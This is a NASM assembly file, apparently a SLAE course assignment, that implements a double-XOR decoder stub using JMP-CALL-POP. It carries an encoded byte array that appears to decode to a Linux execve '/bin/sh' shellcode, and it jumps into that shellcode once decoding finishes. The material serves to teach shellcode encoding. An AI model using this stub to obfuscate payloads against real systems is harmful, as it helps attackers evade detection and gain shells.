; File: xor-decoder-maker.nasm
; Author: Kevin Ren, originally professor viviek of SLAE
; Purpose: to demostrate decoding of xor ecoded shellcode and 
; 		execute without hardcode length by using a marker

; NOTE: we will use the JMP CALL POP Technique to manipulate and decode our encoded shellcode
; NOTE: this method will result in seg fault if compiled and ran without a shellcode skeleton, because we are overwritting text section

; SLAE assignment 4 custom encoder:
; 					used the same xor encoder, but xored it again with another byte
;					thus to decode, we just need to xor it one more time than we did before
;					and xor the additional byte first (0xBB), then xor against 0xAA
;					remember our marker is now 0xbb, we need to check first before xor again with 0xaa
;					this way we can jmp to decoded shellcode as soon as we are at our marker
;					if we compare after, the xor operation with 0xaa will effect our zero flag 
; 					and we wont be able to jmp to shellcode properly because of that, resulting in segfault
;					b/c we kept on xoring the bytes after our shellcode was done, aka 00 bytes


global _start

section .text
_start:
	jmp short call_decoder

decoder:
	pop esi				; esi has the address that points to Shellcode (encoded)
decode:
	xor byte [esi], 0xBB		; added decode
					; we compare this first because the marker is 0xbb, and will set zero flag once xor is complete at the end
					; if we are not at maker, we shall xor again with original 0xaa to get original byte in [esi]
	jz shellcode			; if XORing results in 0, as with marker, ZF will set and this will transfer control to Shellcode
	xor byte [esi], 0xAA		; XORing the first byte of what is stored at ESI address
	inc esi				; if not at marker yet, we will increment esi by a byte
	jmp short decode		; and unconditionally jump to Decode label again


call_decoder:
	call decoder
	shellcode: db 0x20,0xd1,0x41,0x79,0x7f,0x3e,0x62,0x79,0x79,0x3e,0x3e,0x73,0x78,0x98,0xf2,0x41,0x98,0xf3,0x42,0x98,0xf0,0xa1,0x1a,0xdc,0x91,0xbb			; 0xaa is our last marker because its the string we XORed against during encoding, and will result in zero

